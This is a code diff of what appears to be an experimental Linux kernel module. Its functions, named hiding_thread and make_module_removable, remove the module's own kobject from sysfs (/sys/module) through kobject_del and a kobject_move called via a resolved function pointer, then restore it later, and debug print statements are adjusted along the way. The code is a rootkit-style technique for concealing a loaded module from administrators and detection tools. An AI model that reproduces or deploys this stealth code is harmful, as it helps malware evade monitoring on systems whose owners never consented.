@@ -84,6 +84,7 @@ static int hiding_thread(void * data){
 
   tmp_kobj = &THIS_MODULE->mkobj.kobj;
   tmp_parent = tmp_kobj->parent;
+  check = ((int (*)(struct kobject *, struct kobject * ))kobject_move_T)(tmp_kobj, NULL);
   //check = kobject_move(tmp_kobj, NULL);// /sys/modules
  // if(!tmp_kobj){
  //   printk(KERN_INFO "etwas stimmt nicht\n");
@@ -99,10 +100,9 @@ static int hiding_thread(void * data){
   //tmp_sd = sysfs_new_dirent(tmp_kobj->sd->s_name, tmp_kobj->sd->s_mode, tmp_kobj->sd->s_flags);
   tmp_sd = (struct sysfs_dirent *)kmalloc(sizeof(struct sysfs_dirent), GFP_KERNEL);
   memcpy(tmp_sd, tmp_kobj->sd, sizeof(struct sysfs_dirent));
-  printk(KERN_INFO "kobject name: %s'n", tmp_kobj->name);
-  printk(KERN_INFO "kobject name: %s'n", tmp_kobj->name);
+  printk(KERN_INFO "holders dir name: %s\n", THIS_MODULE->holders_dir->name);
   kobject_del(&THIS_MODULE->mkobj.kobj);// /sys/modules
-  printk(KERN_INFO "kobject name: %s'n", tmp_kobj->name);
+  printk(KERN_INFO "kobject name: %s\n", tmp_kobj->name);
   printk(KERN_INFO "name: %s\n", tmp_sd->s_name);
   printk(KERN_INFO "parent name: %s\n", tmp_sd->s_parent->s_name);
 
@@ -127,8 +127,10 @@ int make_module_removable(void * data){
 	//THIS_MODULE->mkobj.kobj = &tmp_kobj;
   //THIS_MODULE->sect_attrs = tmp_sect;
   //THIS_MODULE->notes_attrs = tmp_notes;
-	tmp_kobj->sd = tmp_sd;
-  error = kobject_add(tmp_kobj, tmp_parent, tmp_kobj->name);
+  printk(KERN_INFO "holders dir name: %s\n", THIS_MODULE->holders_dir->name);
+  error = ((int (*)(struct kobject *, struct kobject *))kobject_move_T)(tmp_kobj, tmp_parent);
+	//tmp_kobj->sd = tmp_sd;
+  //error = kobject_add(tmp_kobj, tmp_parent, tmp_kobj->name);
   printk(KERN_INFO "module removable, error: %d\n", module_refcount(THIS_MODULE));
   //kobject_put(tmp_kobj);
   //kobject_put(tmp_kobj);
